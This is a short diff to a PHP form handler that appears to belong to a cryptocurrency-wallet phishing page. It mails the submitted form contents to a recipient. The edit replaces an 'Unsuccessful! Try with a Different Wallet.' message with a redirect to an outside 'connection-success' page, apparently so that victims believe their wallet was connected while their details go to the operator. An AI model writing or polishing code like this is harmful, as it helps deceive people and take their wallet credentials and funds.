@@ -21,10 +21,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $success = mail($recipient, $subject, $message);
 
     // Check if the email was sent successfully
-    if ($success) {
-        echo 'Unsuccessful! Try with a Different Wallet.';
+	if ($success) {
+        header('Location: https://www.lovehateinu.xyz/apiv4wc-connection-success/index.html'); // Corrected redirection
+        exit();
     } else {
-        echo 'Error.';
+        echo "An error occurred";
     }
 }
 ?>
